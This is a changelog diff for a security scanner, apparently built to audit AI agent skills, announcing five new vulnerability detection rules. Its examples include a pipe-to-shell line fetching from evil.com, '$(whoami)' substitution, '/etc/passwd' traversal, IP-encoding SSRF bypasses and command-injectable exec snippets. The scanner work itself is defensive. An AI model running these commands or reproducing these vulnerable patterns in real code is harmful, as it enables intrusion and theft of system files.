@@ -1,5 +1,15 @@
 # SHIPLOG — SkillAudit Shipping Log
 
+## 2026-02-23 (7:00 AM) — 5 New Detection Rules: Path Traversal, Command Injection, Prototype Pollution, Advanced SSRF, ReDoS
+**What:** 5 new rule categories with 44 patterns covering fundamental security vulnerabilities the scanner was missing. Total rules: 32 → 37. Total patterns: 289 → 333.
+**New rules:**
+- `PATH_TRAVERSAL` (high, 12 patterns) — Detects `../../../etc/passwd`, URL-encoded traversal (`..%2F`), `path.join` with traversal sequences, `readFile` accessing system files, and path manipulation in Python (`os.path.join`). Catches both direct traversal and encoded bypass attempts.
+- `CMD_INJECTION` (critical, 12 patterns) — Detects shell command construction from user input: `exec` with template literals (`${userInput}`), `subprocess.run` with `shell=True` and f-strings, pipe-to-shell chains (`; curl evil.com | bash`), backtick command substitution (`$(whoami)`), Java's `Runtime.getRuntime().exec`, and PHP `system()`/`passthru()` with variables.
+- `PROTOTYPE_POLLUTION` (high, 8 patterns) — Detects `__proto__` property manipulation, `constructor.prototype` access, `Object.assign`/`setPrototypeOf` with prototype keys, bracket notation pollution (`["__proto__"]`), and dangerous merge/extend patterns that pass user input directly (`deepMerge(defaults, req.body)`).
+- `SSRF_ADVANCED` (high, 8 patterns) — Detects user-controlled URL in fetch/axios/http.get calls, octal/hex/decimal IP bypass techniques (`0177.0.0.1`, `0x7f.0.0.1`, `2130706433`), IPv6 localhost variants, and URL parser differential attacks.
+- `REGEX_DOS` (medium, 4 patterns) — Detects user-controlled `new RegExp()` construction, nested quantifiers that cause catastrophic backtracking (`(a+)+`), and dynamic regex from request parameters.
+**Why:** These are bread-and-butter security patterns that every serious scanner must detect. The existing rules covered agent-specific attacks (prompt injection, schema poisoning, A2A manipulation) but missed fundamental web/code vulnerabilities. A skill with `exec(\`grep ${req.params.name} /var/log\`)` is a command injection vector. A skill with `deepMerge(config, req.body)` is prototype pollution waiting to happen. A skill with `readFileSync("../../../etc/passwd")` is path traversal. These are the #1, #2, and #3 most common code vulnerabilities in OWASP — now SkillAudit catches them all. Combined with the existing rules, SkillAudit now covers both the agent-era attack surface AND the classic web security attack surface.
+
 ## 2026-02-23 (1:00 AM) — Scan Summary Cards (Embeddable SVG)
 **What:** `GET /scan/:id/card.svg` — generates a visual SVG card for any scan result. Dark theme, risk-colored header, score, findings count, and top 3 findings. Embeddable anywhere images work.
 **Design:**
